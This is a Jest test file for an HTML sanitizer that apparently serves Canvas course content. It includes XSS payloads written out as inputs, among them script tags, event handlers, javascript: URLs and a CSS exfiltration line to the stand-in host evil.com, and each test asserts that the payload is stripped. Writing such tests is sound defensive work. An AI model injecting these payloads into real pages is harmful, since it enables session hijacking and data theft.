import { describe, expect, it } from '@jest/globals'
import { sanitizeHtml } from '../sanitize'

describe('sanitizeHtml', () => {
  describe('equation images (Canvas-specific)', () => {
    it('rewrites /equation_images src to absolute canvas URL', () => {
      const equationImage =
        'Some text with an <img src="/equation_images/image" />'
      expect(sanitizeHtml(equationImage)).toContain(
        'canvas.instructure.com/equation_images/image'
      )
    })

    it('adds vertical-align style to equation images', () => {
      const equationImage = '<img src="/equation_images/abc" />'
      expect(sanitizeHtml(equationImage)).toContain('vertical-align: middle')
    })

    it('leaves non-equation image src untouched', () => {
      const otherImage = '<img src="/another_image">'
      const out = sanitizeHtml(otherImage)
      expect(out).toContain('src="/another_image"')
      expect(out).not.toContain('canvas.instructure.com')
    })
  })

  describe('null / empty input handling', () => {
    it('returns empty string for null', () => {
      expect(sanitizeHtml(null)).toBe('')
    })

    it('returns empty string for undefined', () => {
      expect(sanitizeHtml(undefined)).toBe('')
    })

    it('returns empty string for empty string', () => {
      expect(sanitizeHtml('')).toBe('')
    })
  })

  describe('XSS - script execution vectors', () => {
    it('strips <script> tags', () => {
      const xss = 'Hello<script>alert(1)</script>World'
      const out = sanitizeHtml(xss)
      expect(out).not.toContain('<script')
      expect(out).not.toContain('alert(1)')
    })

    it('strips inline event handlers (onerror)', () => {
      const xss = '<img src="x" onerror="alert(1)">'
      const out = sanitizeHtml(xss)
      expect(out).not.toMatch(/onerror/i)
      expect(out).not.toContain('alert(1)')
    })

    it('strips inline event handlers (onclick)', () => {
      const xss = '<a href="#" onclick="alert(1)">click</a>'
      const out = sanitizeHtml(xss)
      expect(out).not.toMatch(/onclick/i)
    })

    it('strips inline event handlers (onload on svg)', () => {
      const xss = '<svg onload="alert(1)"></svg>'
      const out = sanitizeHtml(xss)
      expect(out).not.toMatch(/onload/i)
      expect(out).not.toContain('alert(1)')
    })

    it('strips javascript: URLs in href', () => {
      // eslint-disable-next-line no-script-url
      const xss = '<a href="javascript:alert(1)">x</a>'
      const out = sanitizeHtml(xss)
      expect(out).not.toMatch(/javascript:/i)
    })

    it('strips javascript: URLs in img src', () => {
      // eslint-disable-next-line no-script-url
      const xss = '<img src="javascript:alert(1)">'
      const out = sanitizeHtml(xss)
      expect(out).not.toMatch(/javascript:/i)
    })

    it('strips data: URLs that contain HTML/JS in iframe src', () => {
      const xss =
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'
      const out = sanitizeHtml(xss)
      expect(out).not.toContain('alert(1)')
    })

    it('strips <object> tags', () => {
      const xss = '<object data="evil.swf"></object>'
      expect(sanitizeHtml(xss)).not.toContain('<object')
    })

    it('strips <embed> tags', () => {
      const xss = '<embed src="evil.swf">'
      expect(sanitizeHtml(xss)).not.toContain('<embed')
    })

    it('strips <form> tags (CSRF / phishing surface)', () => {
      const xss = '<form action="https://evil.com"><input name=x></form>'
      expect(sanitizeHtml(xss)).not.toContain('<form')
    })

    it('strips style tags (CSS-based exfil / clickjacking)', () => {
      const xss = '<style>body{background:url(//evil.com/?c=)}</style>'
      expect(sanitizeHtml(xss)).not.toContain('<style')
    })

    it('strips <meta http-equiv refresh> redirects', () => {
      const xss =
        '<meta http-equiv="refresh" content="0;url=https://evil.com">'
      expect(sanitizeHtml(xss)).not.toContain('<meta')
    })

    it('strips <base> tag (can rewrite all relative URLs)', () => {
      const xss = '<base href="https://evil.com/">'
      expect(sanitizeHtml(xss)).not.toContain('<base')
    })

    it('strips encoded onerror payloads', () => {
      const xss = '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'
      const out = sanitizeHtml(xss)
      expect(out).not.toMatch(/onerror/i)
    })

    it('strips mixed-case obfuscated script tags', () => {
      const xss = '<ScRiPt>alert(1)</sCrIpT>'
      const out = sanitizeHtml(xss)
      expect(out).not.toMatch(/<script/i)
      expect(out).not.toContain('alert(1)')
    })
  })

  describe('benign HTML (should be preserved)', () => {
    it('preserves basic formatting tags', () => {
      const html = '<p>Hello <strong>world</strong> <em>!</em></p>'
      expect(sanitizeHtml(html)).toBe(html)
    })

    it('preserves links with safe http(s) hrefs', () => {
      const html = '<a href="https://example.com">link</a>'
      expect(sanitizeHtml(html)).toContain('href="https://example.com"')
    })

    it('preserves lists', () => {
      const html = '<ul><li>a</li><li>b</li></ul>'
      expect(sanitizeHtml(html)).toBe(html)
    })

    it('preserves Canvas RCE iframes (Studio / media embeds)', () => {
      const html =
        '<iframe src="https://canvas.instructure.com/media_objects_iframe/123" ' +
        'allowfullscreen="" allow="fullscreen" frameborder="0" ' +
        'data-media-id="123" data-media-type="video"></iframe>'
      const out = sanitizeHtml(html)
      expect(out).toContain('<iframe')
      expect(out).toContain('data-media-id="123"')
      expect(out).toContain('data-media-type="video"')
      expect(out).toContain('allowfullscreen')
    })
  })

  describe('link hardening', () => {
    it('adds rel="noopener noreferrer" to target=_blank links', () => {
      const html = '<a href="https://example.com" target="_blank">x</a>'
      const out = sanitizeHtml(html)
      expect(out).toMatch(/rel=["'][^"']*noopener[^"']*["']/)
      expect(out).toMatch(/rel=["'][^"']*noreferrer[^"']*["']/)
    })
  })
})
